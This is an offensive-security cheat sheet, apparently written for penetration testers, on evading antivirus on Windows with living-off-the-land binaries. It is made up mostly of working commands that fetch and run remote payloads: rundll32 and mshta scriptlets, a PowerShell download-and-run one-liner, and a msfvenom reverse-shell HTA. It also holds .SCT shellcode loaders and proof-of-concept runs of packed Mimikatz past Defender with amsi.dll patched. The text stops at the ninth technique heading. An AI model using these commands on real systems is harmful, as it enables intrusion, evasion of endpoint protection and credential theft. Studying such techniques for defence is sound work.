================================================================================================================================================================
AV bypass using 'Living Off The Land' and fileless techniques
================================================================================================================================================================

INDEX
******

I.   Reminder & Definitions
     ➤ Why using 'Living Off The Land' and fileless techniques?
     ➤ Microsoft Antimalware Scan Interface (AMSI)
     ➤ Windows security features and Microsoft security products

II.  Basic examples of 'Living Off The Land' techniques using LOLBAS (i.e. Living Off The Land Binaries, Scripts and Libraries)
     ➤ Rundll32.exe
     ➤ Pcalua.exe
     ➤ Remote.exe
     ➤ WMI.exe
     ➤ Mshta.exe
     ➤ etc.

III. Basic examples of 'Living Off The Land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts)
     ➤ PowerShell scripts
     ➤ .Net Assemblies (PE and DLL)

IV.  Basic examples of 'Living Off The Land' techniques using Python (i.e. load & execute straight in-memory PE/DLL/scripts)
     ➤ Python scripts
     ➤ PE and DLL (unmanaged code) loding using the 'PythonMemoryModule'

V.   AMSI bypass techniques to be able to load and execute in-memory offensive tools (PowerShell scripts & C# assemblies) without being detected by Antivirus
     ➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
     ➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory (AmsiScanBuffer)
     ➤ AMSI bypass technique 3 - Patching the "Amsi.dll" in memory (AmsiOpenSession)
     ➤ AMSI bypass technique 4 - Using hardware breakpoint on "AmsiScanBuffer"
     ➤ AMSI bypass technique 5 - Modify a Windows registry key to disable the AMSI (admin priv required)
     ➤ AMSI bypass technique 6 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
     ➤ AMSI bypass technique 7 - AMSI dll hijacking
     ➤ AMSI bypass technique 8 - Lifetime AMSI bypass by @ZeroMemoryEx 

VI.  Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive C# .Net assemblies

VII. Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files (un-managed code like C/C++ programs)


================================================================================================================================================================
I. Reminder & Definitions
================================================================================================================================================================

-----------------------------------------------------------------------------------------------------------------------------------------------------------
1.1 Why using 'living off the land and fileless' techniques ?
-----------------------------------------------------------------------------------------------------------------------------------------------------------
The purpose of the 'living off the land' and fileless techniques is to avoid getting detected and blocked by the antivirus and end-point protection 
solutions installed on modern Windows machines during penetration tests by:
 - running scripts, portable executable files and shellcodes directly into memory  
 - using as much as possible legitimate sysadmin tools and software that are already installed on the target computers.
  
The four main categories of living off the land and fileless attack techniques are: 
 - memory-only threats, 
 - fileless persistence, 
 - dual-use tools,
 - non-PE file attacks.

In general, creating less new files on the hard disk means less chance of being detected by traditional security tools (i.e. AV) and therefore minimizes the
risk of an attack being detected and blocked.

During a penetration test, before loading and executing directly in-memory PowerShell/VBS/JS scripts, or C# assemblies (i.e., .Net dll and PE files) 
on modern Windows systems it is recommended to disable the Antimalware Scan Interface (AMSI) to avoid our malicious files being scanned and potentially 
blocked by the AV solutions installed on the Windows systems.

-----------------------------------------------------------------------------------------------------------------------------------------------------------
1.2 Microsoft Antimalware Scan Interface (AMSI)
-----------------------------------------------------------------------------------------------------------------------------------------------------------
➤ The Microsoft Antimalware Scan Interface (AMSI) provides enhanced malware protection by allowing the Antivirus solution installed on a modern Windows computer
   (i.e. Windows 10/11 or Windows server 2016/2019/2022/2025) to scan the applications and scripts before they are executed. 
   For instance, the AMSI feature is integrated into these components when they are executed:
   - User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
   - PowerShell greater than 2.0 (scripts, interactive use, and dynamic code evaluation)
   - Windows Script Host (wscript.exe and cscript.exe)
   - JavaScript and VBScript
   - Office VBA macros
   - .NET Framework 4.8 or newer (scanning of all assemblies)
   - Windows Management Instrumentation (WMI)

➤ The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows the applications and services to integrate  with any antimalware 
   product that's present on a Windows machine (e.g. Microsoft Defender AntiVirus is enabled by default on all modern Windows OS).
   AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware 
   products that can be integrated into applications. 
  
➤ The AMSI protects PowerShell by loading AMSI’s DLL (amsi.dll) into the PowerShell’s memory space.
   It scans the PowerShell console input by using Microsoft Defender (or other AV) to determine whether to block the payload operation or allow it to continue.
   Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.
   - AmsiScanBuffer()
   - AmsiScanString()

➤ There are many techniques to bypass AMSI such as:
   - patching the amsi.dll in memory
   - using a hardware breakpoint on "AmsiScanBuffer"
   - setting the “amsiInitFailed” flag to prevent AMSI scanning capability for the current process (the strings 'AmsiUtils' & 'amsiInitFailed'
     are encoded to avoid the AV to detect and block the AMSI bypass)
   - forcing an error i.e. forcing the AMSI initialization to fail (amsiInitFailed) so no scan will be initiated for the current process
   - placing a separate amsi.dll in the current working directory (note: legacy technique)
   - Windows registry key modification
  The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result and not being flagged as “malicious”. 

➤ Usefull links:
   - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
   - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
   - https://www.r-tec.net/r-tec-blog-bypass-amsi-in-2025.html
   - https://amsi.fail
   - https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/
   - etc.
  
-----------------------------------------------------------------------------------------------------------------------------------------------------------
1.3 Windows security features and Microsoft security products
-----------------------------------------------------------------------------------------------------------------------------------------------------------

➤ PowerShell security features
  -----------------------------
   Microsoft has added some security features in PowerShell v5 to help out the Blue teams such as: 
   1. Constrained Language Mode
      + It is a setting in PowerShell that greatly limits what commands can be performed. This can potentially reduce the available attack surface to adversary's. 
   2. Deep Script Block Logging
      + It records block of code as they are executed therefore it captures the complete activity and full content of the script. 
      + It maintains the complete audit trail of each activity which can be used later in forensics and to study the malicious behavior. 
      + It records all the activity at time of execution thus provides the complete details.
      + Everytime an adversary executes an encoded PowerShell script or command, script block logging provides that data in its raw form.
   3. System-Wide Transcripts
      + It creates a record of all or part of a PowerShell session to a text file. 
      + The transcript includes all command that the user types and all output that appears on the console.
   4 Antimalware Scan Interface (AMSI)  

➤ Microsoft Defender Antivirus
  ----------------------------
   1. Virus and threat protections
      + Automatic and manual AV scanning (signature-based detection)
      + Utilizes the anti-malware Scan Interface (AMSI) to enhance protection against fileless malware, dynamic script-based attacks, and other nontraditional threats.
      + Real-Time protection 
        o Real-time protection, behavior monitoring, and heuristics to identify malware based on known suspicious and malicious activities including events, 
          such as processes making unusual changes to existing files, modifying or creating automatic startup registry keys and startup locations, and other 
          changes to the file system or file structure. 
        o Monitors process behavior to detect and analyze potential threats based on the behavior of applications, services, and files. 
      + Cloud-delivered protection
        o Cloud protection works together with Microsoft Defender AV to enhance standard real-time protection.
        o Malware detection through generic and heuristic techniques as well as behavioral analysis to detect file-based and file-less attacks.
      + Automatic Sample submission
        o Cloud protection and automatic sample submission work together with Microsoft Defender AV to help protect against new and emerging threats.
        o If a suspicious or malicious file is detected, a sample is sent to the cloud service for analysis while Microsoft Defender Antivirus blocks the file. 
   2. Tamper protection
      + Pevents other from tampering with important security features.
   3. Controlled folder access & Ransomware protection
      + Protects files, folders and memory areas on the device from unauthorized changes by unfriendly applications.
   4. App and browser control (a.k.a Microsoft Defender SmartScreen)
      + Reputation-based protection against "Potentially Unwanted Application" (PUA)
        The following settings protect the device form malicious or potentially unwanted app, files and websites.
         o Check apps and files (for unrecognized apps and files from the Web)
         o SmartScreen for Microsoft Edge (PUA protection in Chromium-based Microsoft Edge)
         o Potentially unwanted app blocking (protect from low-reputation apps that might cause unexpected behaviours)
   5. Notifications
      + Windows security can send notifcations with critical information about the health and security of the device.

➤ Software whitelisting using AppLocker
  -------------------------------------
   - AppLocker is an application whitelisting technology introduced with Microsoft's Windows 7 OS. It allows restricting which programs users can execute 
     based on the program's path, publisher, or hash, and in an enterprise can be configured via GPO.
   - AppLocker can control the following file types: Executables, DLLs, Scripts, Windows Installers, Packaged apps and installers.
   - AppLocker supports Windows 10/11 and Windows server 2016 and above.
  
➤ Windows Event Tracing (ETW) 
  ---------------------------
   - ETW provides a way to trace and log events from both user and kernel mode. 
   - It is used by AV and EDR to detect attacks.
  
➤ LSASS & Protected Process Light (PPL)
  -------------------------------------
   - On Windows the Local Security Authority Subsystem is responsible for safeguarding the NTLM hashes, Kerberos tickets and anything that has to do with 
     authentication and authorization.
   - To prevent the bad guys from stealing credentials, a security feature called LSA (Local Security Authority) Protection Light was introduced.
   - RunAsPPL for LSASS is a true quick win. It is very easy to configure as the only thing you have to do is add a simple value in the registry and reboot. 
     Like any other protection though, it is not bulletproof and it is not sufficient on its own, but it is still particularly efficient. 
     Attackers will have to use some relatively advanced tricks if they want to work around it, which ultimately increases their chance of being detected.
    
➤ Microsoft Defender Credential Guard
  -----------------------------------
   - It uses virtualization-based security to isolate secrets so that only privileged system software can access them. 
     Unauthorized access to these secrets can lead to credential theft attacks, such as Pass-the-Hash or Pass-The-Ticket. 
     Microsoft Defender Credential Guard prevents these attacks by protecting NTLM password hashes, Kerberos Ticket Granting Tickets, and credentials stored 
     by applications as domain credentials.
   - By enabling Microsoft Defender Credential Guard, the following features and solutions are provided:
     + Hardware security NTLM, Kerberos, and Credential Manager take advantage of platform security features, including Secure Boot and virtualization, to 
       protect credentials.
     + Virtualization-based security Windows NTLM and Kerberos derived credentials and other secrets run in a protected environment that is isolated from the
       running operating system.
     + Better protection against advanced persistent threats When Credential Manager domain credentials, NTLM, and Kerberos derived credentials are protected 
       using virtualization-based security, the credential theft attack techniques and tools used in many targeted attacks are blocked. 
       Malware running in the operating system with administrative privileges cannot extract secrets that are protected by virtualization-based security.

➤ Microsoft Defender for Endpoint (EDR formerly known as Microsoft Defender Advanced Threat Protection "ATP")
  -----------------------------------------------------------------------------------------------------------
   - Microsoft Defender for Endpoint is an enterprise endpoint security platform designed to help enterprise networks prevent, detect, investigate, and respond 
     to advanced threats.

➤ Microsoft Defender for Office 365
  ---------------------------------
   - Microsoft Defender for Office 365 is a cloud-based product offering protection against email threats and safeguarding files stored in the cloud.

➤ The Windows Lockdown Policy (WLDP aka Device Guard) 
   - It checks the digital signature of dynamic code.


================================================================================================================================================================
II. Basic examples of 'Living off the land' techniques using LOLBAS (i.e. Living Off The Land Binaries, Scripts and Libraries)
================================================================================================================================================================

➤ LOLBAS (i.e. "Living Off The Land Binaries, Scripts and Libraries") refers to the use of legitimate, built-in system binaries or processes to execute 
  malicious activities. By leveraging these trusted applications, attackers can camouflage their actions, making it difficult for traditional security 
  measures to detect and respond effectively.

➤ The goal of the 'LOLBAS' project (URL below) is to document every binary, script, and library that can be used for 'Living Off The Land' techniques.
   => https://lolbas-project.github.io/#
   => https://github.com/LOLBAS-Project/LOLBAS#criteria
   => http://malcommands.com/

➤ The examples of LOLBAS presented below are focused on remote execution of PE/EXE, DLL and scripts, and file-less attacks.


---------------------------------------------------------------------------------------------------------------------------------------------------
1. LOLBAS - Rundll32.exe (Allow to execute remote DLL and scripts)
---------------------------------------------------------------------------------------------------------------------------------------------------

➤ Paths:
   => C:\Windows\System32\rundll32.exe
   => C:\Windows\SysWOW64\rundll32.exe


➤ Execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute (i.e. execute DLL from SMB share.)

   C:\> rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint


➤ Execute a remote JavaScript files (that could embed offensive security tools or a C2 agent)

   C:\> rundll32.exe javascript:”\..\mshtml,RunHTMLApplication “;document.write();GetObject(“script:httpS://X.X.X.X/payload.sct").Exec();

    Test - How to use this technique to execute a remote C2 agent on a Windows machine 
    ----------------------------------------------------------------------------------
    Step 1. Generate a raw shellcode with your favorite C2 framework and start a reverse HTTPs listener
    Step 2. Convert the format of the shellcode in C# (using for instance the tool "Supernova")
    Step 3. Insert the C# shellcode in a C# shellcode loader template
    Step 4. Use the tool "GadgetToJScript" to generate an obfuscated JavaScript file that embed your C# shellcode loader (.CS) in a .NET serialized
    	      gadget (that will load & execute the C# shellcode loader when deserialized using BinaryFormatter from the JS script)		
    Step 5. Manually obfuscate the JavaScript file and insert it in a .SCT file
    Step 6. Use "Rundll32.exe" to execute on a Windows machine the malicious code contained in the .SCT file hosted on your remote Webserver
    Step 7. Enjoy your C2 reverse shell 	  
					
    + Example n°1 of a .SCT file to execute Javascript code (JS generated with https://github.com/med0x2e/GadgetToJScript/tree/master)
      ---------------------------------------------------------------------------------------------------------------------------------
	  
			  <?XML version="1.0"?>
			  <scriptlet>
				<public>
					<method name="Exec"></method>
				</public>
				<script language="JScript">
				<![CDATA[
					function Exec()
					{
						function Base64ToStream(b,l) {
							var enc = new ActiveXObject("System.Text.ASCIIEncoding");
							var length = enc.GetByteCount_2(b);
							var ba = enc.GetBytes_4(b);
							var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
							ba = transform.TransformFinalBlock(ba, 0, length);
							var ms = new ActiveXObject("System.IO.MemoryStream");
							ms.Write(ba, 0, l);
							ms.Position = 0;
							return ms;
						}
						var stage_1 ="BLOB";
						var stage_2 ="BLOB";
						try {
							var shell = new ActiveXObject('WScript.Shell');
							ver = 'v4.0.30319';
							try {
								shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
							} catch(e) { 
								ver = 'v2.0.50727';
							}
							shell.Environment('Process')('COMPLUS_Version') = ver;
							var ms_1 = Base64ToStream(stage_1, 2341);
							var fmt_1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
							fmt_1.Deserialize_2(ms_1);
						} catch (e) {
							try{		
								var ms_2 = Base64ToStream(stage_2, 117896);
								var fmt_2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
								fmt_2.Deserialize_2(ms_2);
							}catch (e2){}
						}
					}
				]]>
				</script>
			</scriptlet>
	    
    + Example n°2 of a .SCT file to execute Javascript code (JS generated with https://github.com/tyranid/DotNetToJScript)
      --------------------------------------------------------------------------------------------------------------------

			<?XML version="1.0"?>
			<scriptlet>
				<public>
					<method name="Exec"></method>
				</public>
				<script language="JScript">
				<![CDATA[
					function Exec()
					{
						function setversion() {
						new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
						}
						function debug(s) {}
						function base64ToStream(b) {
							var enc = new ActiveXObject("System.Text.ASCIIEncoding");
							var length = enc.GetByteCount_2(b);
							var ba = enc.GetBytes_4(b);
							var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
							ba = transform.TransformFinalBlock(ba, 0, length);
							var ms = new ActiveXObject("System.IO.MemoryStream");
							ms.Write(ba, 0, (length / 4) * 3);
							ms.Position = 0;
							return ms;
						}
						var serialized_obj = "-----------INSERT-SERIALiZED-OBJECT-HERE------------"
						var entry_class = 'Test';
						try {
							setversion();
							var stm = base64ToStream(serialized_obj);
							var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
							var al = new ActiveXObject('System.Collections.ArrayList');
							var d = fmt.Deserialize_2(stm);
							al.Add(undefined);
							var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
						} catch (e) {
							debug(e.message);
						}
					}
				]]>
				</script>
			</scriptlet>


➤ Execute a JavaScript script that execute a remote PowerShell script (that could embed offensive security tools or a C2 agent)

   C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run
                     ("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")


    + Example of a .SCT file to execute PowerShell code (SCT generated with https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1)
      --------------------------------------------------------------------------------------------------------------------------------------------

			<?XML version="1.0"?>
			<scriptlet>
				<registration 
					progid="WinCheck"
					classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

					<script language="JScript">
						<![CDATA[
							ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
							c = "Insert-PoSH-Payload-Here";
							r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
						]]>
					</script>
				</registration>
			</scriptlet>



➤ Use "Rundll32.exe" and "dfshim.dll" to executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)

   C:\> rundll32.exe dfshim.dll,ShOpenVerbApplication https://www.example.org/file.ext


---------------------------------------------------------------------------------------------------------------------------------------------------
2. LOLBAS - Pcalua.exe (Program Compatibility Assistant - Allow to execute remote exe and dll files)
---------------------------------------------------------------------------------------------------------------------------------------------------

➤ Path:
   => C:\Windows\System32\pcalua.exe

➤ Execute a remote target binary (.EXE) or DLL using the Program Compatibility Assistant. A pop-up will appear and ask us to confirm the execution 
  of the binary or DLL remotely hosted on a share. In general, the remote binary is executed in a new windows and exit as soon as the execution is 
  finished.

   =>  pcalua.exe -a \\server\payload.dll
   =>  pcalua.exe -a \\server\payload.exe


   + PoC - Use 'Pcalua.exe' to launch a packed version of the hacking tool "Mimikatz" on a Windows laptop protected by Windows Defender AV
     --------------------------------------------------------------------------------------------------------------------------------------
 
     PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,
				  AntivirusSignatureLastUpdated | FL

		AntivirusEnabled              : True
		RealTimeProtectionEnabled     : True
		IoavProtectionEnabled         : True
		AntispywareEnabled            : True
		AntivirusSignatureLastUpdated : 5/8/2025 4:35:53 PM


     PS C:\Temp> C:\Windows\system32\pcalua.exe -a "\\192.168.1.254\files\Packed-Mimi.exe"

		=> A Windows box message pops-up and ask us to confirm the execution of our malicious tool. I clicked on the button "Run".
		 
		"Open File - Security Warning
		We can't verify who created this file. Are yous sure you want to run this file ?

		Name: \\192.168.1.254\files\Packed-Mimi.exe
		Type: Application
		From: \\192.168.1.254\files\Packed-Mimi.exe

		Run button | Cancel button
		"
		=> Then a second Windows pops-up executing my packed/obfuscated version of Mimikatz: 

		[+] Success. amsi.dll Patched!
		[*] Restoring memory protection...

		  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
		 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
		 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
		 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
		 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
		  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

		mimikatz # coffee

			( (
			 ) )
		  .______.
		  |      |]
		  \      /
		   `----'

		mimikatz #


---------------------------------------------------------------------------------------------------------------------------------------------------
3. LOLBAS - Remote.exe (Debugging tool included with Windows Debugging Tools - Allow to execute remote exe files)
---------------------------------------------------------------------------------------------------------------------------------------------------

➤ Path:
   => C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\Remote.exe


➤ It is Debugging tool included with Windows Debugging Tools that can be used to execute a remote binary without saving file to disk.

   => Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere


   + PoC with the hacking tool "PassTheCert" on a Windows computer protected by Windows Defender AV
     ----------------------------------------------------------------------------------------------

     C:\Temp> remote.exe /s "\\192.168.1.254\files\Pass-The-Cert.exe --help" anythinghere
		
     **************************************
     ***********     REMOTE    ************
     ***********     SERVER    ************
     **************************************
     To Connect: Remote /C PO744653 "anythinghere"

     PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] 
			      (--elevate|--rbcd|--add-computer|--set-spn|--reset-password|--add-account-to-group) [ATTACK_OPTIONS]
     GENERAL OPTIONS:
			--server DOMAIN_CONTROLLER
				Domain controller to connect to. By default, connection will be done over TCP/636 (LDAPS).
			--start-tls
				Indicates that connection should instead be done over TCP/389 (LDAP) and then use StartTLS.
			--cert-path CERT_PATH
				Path to the certificate to authenticate with.
			--cert-password CERT_PASSWORD
				Password to the certificate (Optional argument. Default value: <empty>).
		<SNIP>

		Remote exiting. Child (\\192.168.1.254\files\Pass-The-Cert.exe --help) exit code was 0.

		C:\Temp>


➤ It can also be used to launch PowerShell...

   => Remote.exe /s "powershell.exe" anythinghere
	

---------------------------------------------------------------------------------------------------------------------------------------------------
4. LOLBAS - WMI.exe (The WMI command-line (WMIC) utility provides a command-line interface for WMI)
---------------------------------------------------------------------------------------------------------------------------------------------------	

➤ Paths:
   => C:\Windows\System32\wbem\wmic.exe
   => C:\Windows\SysWOW64\wbem\wmic.exe


➤ Executes JScript or VBScript embedded in the target remote XSL stylsheet.

   => wmic.exe process get brief /format:"\\servername\C$\Windows\Temp\file.xsl"


➤ Execute evil.exe on a remote Windows system.

   => wmic.exe /node:"192.X.X.X" process call create "cmd /c c:\windows\system32\calc.exe"


---------------------------------------------------------------------------------------------------------------------------------------------------
5. LOLBAS - Mshta.exe (Allow to execute remote Visual Basic scripts and JavaScript files)
---------------------------------------------------------------------------------------------------------------------------------------------------

➤ Paths: 
   => C:\Windows\System32\mshta.exe
   => C:\Windows\SysWOW64\mshta.exe


➤ Executes VBScript supplied as a command line argument.

   => mshta.exe vbscript:Close(Execute("GetObject(""script:https://www.example.org/file.sct"")"))


➤ Executes JavaScript supplied as a command line argument.

   => mshta.exe javascript:a=GetObject("script:https://www.example.org/file.sct").Exec();close();

      Test - How to use this technique to execute a remote C2 agent on a Windows machine 
      ----------------------------------------------------------------------------------
      Step 1. Generate a raw shellcode with your favorite C2 framework and start a reverse HTTPs listener
      Step 2. Convert the format of the shellcode in C# (using for instance the tool "Supernova")
      Step 3. Insert the C# shellcode in a C# shellcode loader template
      Step 4. Use the tool "GadgetToJScript" to generate an obfuscated JavaScript file that embed your C# shellcode loader (.CS) in a .NET serialized 
              gadget (that will load & execute the C# shellcode loader when deserialized using BinaryFormatter from the JS script)		
      Step 5. Manually obfuscate the JavaScript file and insert it in a .SCT file
      Step 6. Use "Mshta.exe" to execute on a Windows machine the malicious code contained in the .SCT file hosted on your remote Webserver
      Step 7. Enjoy your C2 reverse shell 	  
						
      + Example of a .SCT file to execute Javascript code (JS generated with https://github.com/med0x2e/GadgetToJScript/tree/master) 
        --------------------------------------------------------------------------------------------------------------------------
	  
			  <?XML version="1.0"?>
			  <scriptlet>
				<public>
					<method name="Exec"></method>
				</public>
				<script language="JScript">
				<![CDATA[
					function Exec()
					{
						function Base64ToStream(b,l) {
							var enc = new ActiveXObject("System.Text.ASCIIEncoding");
							var length = enc.GetByteCount_2(b);
							var ba = enc.GetBytes_4(b);
							var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
							ba = transform.TransformFinalBlock(ba, 0, length);
							var ms = new ActiveXObject("System.IO.MemoryStream");
							ms.Write(ba, 0, l);
							ms.Position = 0;
							return ms;
						}
						var stage_1 ="BLOB";
						var stage_2 ="BLOB";
						try {
							var shell = new ActiveXObject('WScript.Shell');
							ver = 'v4.0.30319';
							try {
								shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
							} catch(e) { 
								ver = 'v2.0.50727';
							}
							shell.Environment('Process')('COMPLUS_Version') = ver;
							var ms_1 = Base64ToStream(stage_1, 2341);
							var fmt_1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
							fmt_1.Deserialize_2(ms_1);
						} catch (e) {
							try{		
								var ms_2 = Base64ToStream(stage_2, 117896);
								var fmt_2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
								fmt_2.Deserialize_2(ms_2);
							}catch (e2){}
						}
					}
				]]>
				</script>
			</scriptlet>


➤ Executes HTA file from an external webserver

  => mshta.exe http://webserver/payload.hta

      + Example of a .HTA file  to execute VBScript 
        --------------------------------------------

				<html>
				  <head>
					<title>Hello World</title>
				  </head>
				  <body>
					<h2>Hello World</h2>
					<p>This is an HTA...</p>
				  </body>

				  <script language="VBScript">
					Function Pwn()
					  Set shell = CreateObject("wscript.Shell")
					  shell.run "calc"
					End Function

					Pwn
				  </script>
				</html>

     + Example using Msfvenom
	   ------------------------
	   $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f hta-psh -o shell.hta

		
---------------------------------------------------------------------------------------------------------------------------------------------------
6.LOLBAS - Wscript.exe and Cscript.exe (Allow to download and execute remote Visual Basic scripts and JavaScript files)
---------------------------------------------------------------------------------------------------------------------------------------------------

➤ Paths:
   => C:\Windows\System32\wscript.exe
   => C:\Windows\SysWOW64\wscript.exe
   => C:\Windows\System32\cscript.exe
   => C:\Windows\SysWOW64\cscript.exe


➤ Use 'Wscript.exe' to execute hidden code to evade defensive counter measures by downloading a remote script and storing it in an alternate data stream.

   => echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js 
      && wscript.exe %temp%\test.txt:hi.js


➤ Use 'Cscript.exe' to execute a Visual Basic script stored in an Alternate Data Stream (ADS).

   => cscript //e:vbscript C:\Windows\Temp\file.ext:script.vbs


---------------------------------------------------------------------------------------------------------------------------------------------------
7. LOLBAS - Regsvr32.exe (Allow to proxy execution of remote malicious code)
---------------------------------------------------------------------------------------------------------------------------------------------------

➤ Paths:
   => C:\Windows\System32\regsvr32.exe
   => C:\Windows\SysWOW64\regsvr32.exe


➤ Executes the specified remote .SCT script with scrobj.dll.

   => regsvr32.exe /s /n /u /i:http://example.com/file.sct scrobj.dll

   + Example of a ".SCT" file that executes "calc.exe":
     --------------------------------------------------
  
		<?XML version="1.0"?>
		<scriptlet>
		<registration 
			progid="awl_bypass"
			classid="{A1112221-0000-0000-0000-000DA00DACDC}" >
				<script language="JScript">
						<![CDATA[var r = new ActiveXObject("WScript.Shell").Run("calc.exe");]]>
			</script>
		</registration>
		</scriptlet>


---------------------------------------------------------------------------------------------------------------------------------------------------
8. LOLBAS - Scriptrunner.exe (Execute script and exe files from a remote server)
---------------------------------------------------------------------------------------------------------------------------------------------------

➤ Paths:
   => C:\Windows\System32\scriptrunner.exe
   => C:\Windows\SysWOW64\scriptrunner.exe


➤ It allows to execute .CMD/.BAT script files and executables from a remote server

   => scriptrunner.exe -appvscript \\servername\C$\Windows\Temp\file.cmd
   => scriptrunner.exe -appvscript \\servername\C$\Windows\Temp\file.bat
   => scriptrunner.exe -appvscript \\servername\C$\Windows\Temp\payload.exe

   + Basic PoC n°1 with an obfuscated version of the audit/privesc script "WinPEAS" 
     ------------------------------------------------------------------------------
     C:\> scriptrunner.exe -appvscript \\192.168.1.25\c$\temp\WinPeas.cmd
	  Script filename is \\192.168.1.25\c$\temp\WinPeas.cmd
	  Script arguments are
	  Wait is False
	  Timeout is -1
	  Rollback is False

	  Number of scripts to run: 1
	  Script is \\192.168.1.25\c$\temp\WinPeas.cmd
	  Wait is False
	  RollbackOnError is False

	=> A Windows box message pops-up and ask us to confirm the execution of the script. I clicked on the button "Run".

	  "Open File - Security Warning
	   We can't verify who created this file. Are you sure you want to run this file ?

		Name: \\192.168.1.25\c$\temp\WinPeas.cmd

	  Run button | Cancel button
	  "

	  /!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
	  ERROR: UNC paths (\\machine\share) are not supported.
	  ERROR: UNC paths (\\machine\share) are not supported.
	  ERROR: UNC paths (\\machine\share) are not supported.
	  [i] Check for vulnerabilities for the OS version with the applied patches
	  [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits

	  Host Name:                 Laptop02
	  OS Name:                   Microsoft Windows 10 Professionnel
	  OS Version:                10.0.19045 N/A Build 19045
	  OS Manufacturer:           Microsoft Corporation
	  OS Configuration:          Member Workstation
	  <SNIP>

	  ERROR: UNC paths (\\machine\share) are not supported.
	  [i] You may need to adjust your local date/time to exploit some vulnerability
	  Thu 08/14/2025
	  03:19 AM
		
	  <SNIP>
		
	  Checking for defender whitelisted PATHS
	  ERROR: UNC paths (\\machine\share) are not supported.
	  PowerShell v2 Version:

	  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
		PowerShellVersion    REG_SZ    2.0

	  PowerShell v5 Version:

	  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
		PowerShellVersion    REG_SZ    5.1.19041.1

	  <SNIP>


   + Basic PoC n°2 with a non-obfuscated version of "Mimikatz"
     ---------------------------------------------------------
      C:\> scriptrunner.exe -appvscript \\192.168.1.25\c$\temp\mimikatz.exe
	   Script filename is \\192.168.1.25\c$\temp\audit-mimiv2.exe
	   Script arguments are
	   Wait is False
	   Timeout is -1
	   Rollback is False

	   Number of scripts to run: 1
	   Script is \\192.168.1.25\c$\temp\audit-mimiv2.exe
	   Wait is False
	   RollbackOnError is False

       Error: Operation did not complete successfully because the file contains a virus or potentially unwanted software


   + Basic PoC n°3 with the binary "python.exe"
     ------------------------------------------
      C:\> scriptrunner.exe -appvscript \\192.168.1.25\c$\temp\python.exe
	   Script filename is \\192.168.1.25\c$\temp\python.exe
	   Script arguments are
	   Wait is False
	   Timeout is -1
	   Rollback is False

	   Number of scripts to run: 1
	   Script is \\192.168.1.25\c$\temp\python.exe
	   Wait is False
	   RollbackOnError is False

	=> A Windows box message pops-up and ask us to confirm the execution of the binary. I clicked on the button "Run".

	   "
	   Open File - Security Warning
	   We can't verify who created this file. Are you sure you want to run this file ?

		Name: \\192.168.1.25\c$\temp\python.exe

	   Run button | Cancel button
           "
	
	  \\192.168.1.25\c$\temp\python.exe
	  Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022, 23:13:41) [MSC v.1929 64 bit (AMD64)] on win32
	  >>>


---------------------------------------------------------------------------------------------------------------------------------------------------
9. LOLBAS - Ieexec.exe (Download and execute exe files from a remote server)
